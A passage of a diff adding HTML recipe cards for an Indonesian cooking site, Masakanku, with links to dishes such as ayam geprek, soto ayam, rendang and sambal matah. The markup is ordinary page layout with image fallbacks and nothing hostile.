+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam geprek crispy: pedas nampol cuma 20 menit! - masakanku resep ayam geprek crispy sambal bawang yang super pedas dan gampang. cocok buat lauk harian atau ide jualan. cuma 20 menit jadi!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Geprek Crispy: Pedas Nampol Cuma 20 Menit! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-geprek">Resep Ayam Geprek Crispy: Pedas Nampol Cuma 20 Menit! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep ayam geprek crispy sambal bawang yang super pedas dan gampang. Cocok buat lauk harian atau ide jualan. Cuma 20 ...</p>
+                  <a href="/resep-ayam-geprek" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep soto ayam kuah kuning: hangat, segar, bikin nagih! - masakanku resep soto ayam kuah kuning khas indonesia. kuah kaldu gurih, rempah wangi, plus sambal yang pedas nendang. comfort food sejati!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Soto Ayam Kuah Kuning: Hangat, Segar, Bikin Nagih! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/soto-ayam">Resep Soto Ayam Kuah Kuning: Hangat, Segar, Bikin Nagih! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep soto ayam kuah kuning khas Indonesia. Kuah kaldu gurih, rempah wangi, plus sambal yang pedas nendang. Comfort f...</p>
+                  <a href="/soto-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep tempe mendoan crispy: renyah di luar, lembut di dalam! - masakanku resep tempe mendoan crispy khas banyumas. tepung berbumbu tipis, digoreng setengah matang, dicocol kecap pedas. cemilan favorit sepanjang masa!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Tempe Mendoan Crispy: Renyah di Luar, Lembut di Dalam! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/tempe-mendoan">Resep Tempe Mendoan Crispy: Renyah di Luar, Lembut di Dalam! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep tempe mendoan crispy khas Banyumas. Tepung berbumbu tipis, digoreng setengah matang, dicocol kecap pedas. Cemil...</p>
+                  <a href="/tempe-mendoan" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="tepung ayam goreng sasa: resep ayam goreng lezat dan renyah - masakanku tips membuat ayam goreng crispy pakai tepung sasa.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Tepung Ayam Goreng Sasa: Resep Ayam Goreng Lezat dan Renyah - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/tepung-ayam-goreng-sasa">Tepung Ayam Goreng Sasa: Resep Ayam Goreng Lezat dan Renyah - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Tips membuat ayam goreng crispy pakai tepung Sasa.</p>
+                  <a href="/tepung-ayam-goreng-sasa" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep tongseng sapi: pedas manis, daging empuk, kuah kental bikin nagih! - masakanku resep tongseng sapi khas solo dengan kuah santan kental, pedas manis, dan potongan kol segar. daging empuk, bumbu medok, cocok buat makan siang.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Tongseng Sapi: Pedas Manis, Daging Empuk, Kuah Kental Bikin Nagih! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-tongseng-sapi">Resep Tongseng Sapi: Pedas Manis, Daging Empuk, Kuah Kental Bikin Nagih! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep tongseng sapi khas Solo dengan kuah santan kental, pedas manis, dan potongan kol segar. Daging empuk, bumbu med...</p>
+                  <a href="/resep-tongseng-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="5 cara tumis buncis agar tetap hijau dan renyah bosen buncis lembek dan pucet? coba 5 cara tumis buncis ini. dijamin tetap hijau, crunchy, dan bikin nambah nasi.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="5 Cara Tumis Buncis Agar Tetap Hijau dan Renyah" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-tumis-buncis">5 Cara Tumis Buncis Agar Tetap Hijau dan Renyah</a></h5>
+                  <p class="card-text small flex-grow-1">Bosen buncis lembek dan pucet? Coba 5 cara tumis buncis ini. Dijamin tetap hijau, crunchy, dan bikin nambah nasi.</p>
+                  <a href="/resep-tumis-buncis" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep tumis kacang panjang resep tumis kacang panjang sederhana, enak, dan bergizi. cocok jadi lauk harian. kaya serat, rendah kalori. masak cuma 15 menit!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Tumis Kacang Panjang" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-tumis-kacang-panjang">Resep Tumis Kacang Panjang</a></h5>
+                  <p class="card-text small flex-grow-1">Resep Tumis Kacang Panjang sederhana, enak, dan bergizi. Cocok jadi lauk harian. Kaya serat, rendah kalori. Masak cum...</p>
+                  <a href="/resep-tumis-kacang-panjang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep tumis kangkung belacan: pedas gurih wangi terasi, cocok jadi lauk praktis - masakanku tumis kangkung belacan pedas gurih wangi terasi, praktis 15 menit.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Tumis Kangkung Belacan: Pedas Gurih Wangi Terasi, Cocok Jadi Lauk Praktis - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-tumis-kangkung-belacan">Resep Tumis Kangkung Belacan: Pedas Gurih Wangi Terasi, Cocok Jadi Lauk Praktis - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Tumis kangkung belacan pedas gurih wangi terasi, praktis 15 menit.</p>
+                  <a href="/resep-tumis-kangkung-belacan" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep sate ayam bumbu kacang: empuk, manis, gurih! - masakanku resep sate ayam bumbu kacang legendaris. daging empuk, bumbu kacang medok, plus tips bakar anti gosong. dijamin jadi favorit keluarga!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Sate Ayam Bumbu Kacang: Empuk, Manis, Gurih! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/sate-ayam">Resep Sate Ayam Bumbu Kacang: Empuk, Manis, Gurih! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sate ayam bumbu kacang legendaris. Daging empuk, bumbu kacang medok, plus tips bakar anti gosong. Dijamin jadi ...</p>
+                  <a href="/sate-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="resep soto betawi — panduan lengkap soto betawi kuah susu gurih resep soto betawi lengkap dari awal. pelajari bahan, cara masak, tips kuah susu putih medok dan wangi rempah. ada santan & tanpa santan. anti gagal!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Resep Soto Betawi — Panduan Lengkap Soto Betawi Kuah Susu Gurih" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/resep-soto-betawi">Resep Soto Betawi — Panduan Lengkap Soto Betawi Kuah Susu Gurih</a></h5>
+                  <p class="card-text small flex-grow-1">Resep soto betawi lengkap dari awal. Pelajari bahan, cara masak, tips kuah susu putih medok dan wangi rempah. Ada san...</p>
+                  <a href="/resep-soto-betawi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep sup jagung ayam — hangat, segar &amp; bikin sehat resep sup jagung manis dengan ayam cincang dan wortel. simak cara bikin sup jagung bening yang hangat, gurih, dan bikin badan terasa enakan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Sup Jagung Ayam — Hangat, Segar &amp; Bikin Sehat" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-sup-jagung">Resep Sup Jagung Ayam — Hangat, Segar &amp; Bikin Sehat</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sup jagung manis dengan ayam cincang dan wortel. Simak cara bikin sup jagung bening yang hangat, gurih, dan bik...</p>
+                  <a href="/resep-sup-jagung" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="resep tahu crispy renyah tahan lama resep tahu crispy yang renyah berjam-jam, nggak lecek walau udah dingin. cocok buat cemilan, lauk, atau ide jualan. gampang banget bikinnya!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Resep Tahu Crispy Renyah Tahan Lama" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/resep-tahu-crispy">Resep Tahu Crispy Renyah Tahan Lama</a></h5>
+                  <p class="card-text small flex-grow-1">Resep tahu crispy yang renyah berjam-jam, nggak lecek walau udah dingin. Cocok buat cemilan, lauk, atau ide jualan. G...</p>
+                  <a href="/resep-tahu-crispy" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="resep tahu gejrot khas cirebon yang pedas segar resep tahu gejrot khas cirebon yang pedas, segar, dan gurih. lengkap dengan bahan, cara membuat, tips, dan rahasia kuah kecap cabai rawit yang bikin nagih.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Resep Tahu Gejrot Khas Cirebon yang Pedas Segar" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/resep-tahu-gejrot">Resep Tahu Gejrot Khas Cirebon yang Pedas Segar</a></h5>
+                  <p class="card-text small flex-grow-1">Resep Tahu Gejrot khas Cirebon yang pedas, segar, dan gurih. Lengkap dengan bahan, cara membuat, tips, dan rahasia ku...</p>
+                  <a href="/resep-tahu-gejrot" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep telur balado khas padang: pedas nendang, bikin makan lahap! - masakanku resep telur balado khas minang yang pedas gurih. telur ceplok dengan sambal balado merah merona, cocok jadi lauk praktis sehari-hari.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Telur Balado Khas Padang: Pedas Nendang, Bikin Makan Lahap! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-telur-balado">Resep Telur Balado Khas Padang: Pedas Nendang, Bikin Makan Lahap! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep telur balado khas Minang yang pedas gurih. Telur ceplok dengan sambal balado merah merona, cocok jadi lauk prak...</p>
+                  <a href="/resep-telur-balado" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep semur ayam kentang super empuk bumbu meresap resep semur ayam kentang dengan bumbu kecap yang meresap sempurna. daging ayam empuk, kentang lembut, kuah kental gurih manis. lengkap dengan tips anti gagal.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Semur Ayam Kentang Super Empuk Bumbu Meresap" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-semur-ayam-kentang">Resep Semur Ayam Kentang Super Empuk Bumbu Meresap</a></h5>
+                  <p class="card-text small flex-grow-1">Resep semur ayam kentang dengan bumbu kecap yang meresap sempurna. Daging ayam empuk, kentang lembut, kuah kental gur...</p>
+                  <a href="/resep-semur-ayam-kentang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep sop ayam bening kuah gurih & daging empuk resep sop ayam bening kuah kaldu gurih, daging ayam empuk, sayuran segar. lengkap dengan trik bikin kaldu superior dan tips anti gagal dari pertama principles.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Sop Ayam Bening Kuah Gurih & Daging Empuk" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-sop-ayam">Resep Sop Ayam Bening Kuah Gurih & Daging Empuk</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sop ayam bening kuah kaldu gurih, daging ayam empuk, sayuran segar. Lengkap dengan trik bikin kaldu superior da...</p>
+                  <a href="/resep-sop-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep sop buntut sapi empuk: daging lumer, kuah bening segar! - masakanku resep sop buntut sapi empuk dengan kuah bening gurih. dilengkapi tips rahasia biar daging lumer dan bumbu meresap sempurna. cocok untuk makan siang keluarga!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Sop Buntut Sapi Empuk: Daging Lumer, Kuah Bening Segar! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-sop-buntut-sapi">Resep Sop Buntut Sapi Empuk: Daging Lumer, Kuah Bening Segar! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sop buntut sapi empuk dengan kuah bening gurih. Dilengkapi tips rahasia biar daging lumer dan bumbu meresap sem...</p>
+                  <a href="/resep-sop-buntut-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep sop iga sapi: kuah bening gurih, daging empuk, hangatkan hari! - masakanku resep sop iga sapi bening dengan kuah kaldu yang gurih. daging iga empuk lumer, sayuran segar, cocok jadi menu penghangat badan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Sop Iga Sapi: Kuah Bening Gurih, Daging Empuk, Hangatkan Hari! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-sop-iga-sapi">Resep Sop Iga Sapi: Kuah Bening Gurih, Daging Empuk, Hangatkan Hari! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sop iga sapi bening dengan kuah kaldu yang gurih. Daging iga empuk lumer, sayuran segar, cocok jadi menu pengha...</p>
+                  <a href="/resep-sop-iga-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep sate kambing klasik idul adha yang empuk dan juicy resep sate kambing klasik idul adha yang empuk, tidak bau prengus, dan juicy. lengkap dengan bumbu marinasi, teknik bakar, tips empuk, dan sambal kecap.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Sate Kambing Klasik Idul Adha yang Empuk dan Juicy" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-sate-kambing">Resep Sate Kambing Klasik Idul Adha yang Empuk dan Juicy</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sate kambing klasik Idul Adha yang empuk, tidak bau prengus, dan juicy. Lengkap dengan bumbu marinasi, teknik b...</p>
+                  <a href="/resep-sate-kambing" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep sate padang asli daging sapi resep sate padang asli dengan bumbu kuah kuning kental yang gurih dan kaya rempah. lengkap dengan cara bikin sate daging sapi empuk. dijamin maknyus!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Sate Padang Asli Daging Sapi" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-sate-padang">Resep Sate Padang Asli Daging Sapi</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sate Padang asli dengan bumbu kuah kuning kental yang gurih dan kaya rempah. Lengkap dengan cara bikin sate dag...</p>
+                  <a href="/resep-sate-padang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep sayur asem segar khas betawi: kuah asem pedas bikin makan bertambah! - masakanku sayur asem betawi dengan kacang tanah, kuah asam pedas yang segar.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Sayur Asem Segar Khas Betawi: Kuah Asem Pedas Bikin Makan Bertambah! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-sayur-asem-segar">Resep Sayur Asem Segar Khas Betawi: Kuah Asem Pedas Bikin Makan Bertambah! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Sayur asem Betawi dengan kacang tanah, kuah asam pedas yang segar.</p>
+                  <a href="/resep-sayur-asem-segar" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep sayur bening bayam: 7 trik biar kuah tetap segar sayur bening bayam yang segar dan tidak pahit. ada 7 trik rahasia biar kuah bening dan rasa makin sedap. cocok temani lauk apa aja.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Sayur Bening Bayam: 7 Trik Biar Kuah Tetap Segar" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-sayur-bening-bayam">Resep Sayur Bening Bayam: 7 Trik Biar Kuah Tetap Segar</a></h5>
+                  <p class="card-text small flex-grow-1">Sayur bening bayam yang segar dan tidak pahit. Ada 7 trik rahasia biar kuah bening dan rasa makin sedap. Cocok temani...</p>
+                  <a href="/resep-sayur-bening-bayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep sayur lodeh: gurih santan, isi lengkap, nyaman banget di perut! - masakanku resep sayur lodeh jawa dengan kuah santan gurih, sayuran lengkap, dan bumbu rempah pilihan. cocok buat menu sehari-hari yang sederhana tapi nikmat.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Sayur Lodeh: Gurih Santan, Isi Lengkap, Nyaman Banget di Perut! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-sayur-lodeh">Resep Sayur Lodeh: Gurih Santan, Isi Lengkap, Nyaman Banget di Perut! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sayur lodeh Jawa dengan kuah santan gurih, sayuran lengkap, dan bumbu rempah pilihan. Cocok buat menu sehari-ha...</p>
+                  <a href="/resep-sayur-lodeh" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="resep seblak khas sunda resep seblak lengkap dari awal sampai akhir. pedas, gurih, kenyal. cocok buat jualan atau camilan sore. dijamin nagih!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Resep Seblak Khas Sunda" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/resep-seblak">Resep Seblak Khas Sunda</a></h5>
+                  <p class="card-text small flex-grow-1">Resep seblak lengkap dari awal sampai akhir. Pedas, gurih, kenyal. Cocok buat jualan atau camilan sore. Dijamin nagih!</p>
+                  <a href="/resep-seblak" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep rendang sapi empuk khas padang: bumbu meresap, daging lumer! - masakanku rendang sapi autentik minang, dimasak perlahan sampai empuk dan hitam pekat.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Rendang Sapi Empuk Khas Padang: Bumbu Meresap, Daging Lumer! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-rendang-sapi">Resep Rendang Sapi Empuk Khas Padang: Bumbu Meresap, Daging Lumer! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Rendang sapi autentik Minang, dimasak perlahan sampai empuk dan hitam pekat.</p>
+                  <a href="/resep-rendang-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep risoles isi ayam sayuran resep risoles isi ayam dan sayuran yang crispy di luar, creamy di dalam. camilan klasik favorit semua kalangan. lengkap dengan tips anti gagal!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Risoles Isi Ayam Sayuran" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-risoles">Resep Risoles Isi Ayam Sayuran</a></h5>
+                  <p class="card-text small flex-grow-1">Resep risoles isi ayam dan sayuran yang crispy di luar, creamy di dalam. Camilan klasik favorit semua kalangan. Lengk...</p>
+                  <a href="/resep-risoles" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep sambal goreng kentang hati sapi — cocok buat lebaran & acara keluarga resep sambal goreng kentang hati sapi lengkap — dari bahan, bumbu halus, cara masak, sampai tips anti gagal. cocok buat lebaran, acara keluarga, atau stok lauk favorit!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Sambal Goreng Kentang Hati Sapi — Cocok buat Lebaran & Acara Keluarga" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-sambal-goreng-kentang-hati">Resep Sambal Goreng Kentang Hati Sapi — Cocok buat Lebaran & Acara Keluarga</a></h5>
+                  <p class="card-text small flex-grow-1">Resep sambal goreng kentang hati sapi lengkap — dari bahan, bumbu halus, cara masak, sampai tips anti gagal. Cocok bu...</p>
+                  <a href="/resep-sambal-goreng-kentang-hati" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sambal" data-search="resep sambal matah asli bali: pedas segar, aroma jeruk limau bikin nagih! - masakanku sambal khas bali, segar dengan bawang merah, serai, cabai, dan minyak kelapa.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1549037173-e3b7184319e6?w=600&q=80" alt="Resep Sambal Matah Asli Bali: Pedas Segar, Aroma Jeruk Limau Bikin Nagih! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sambal</span>
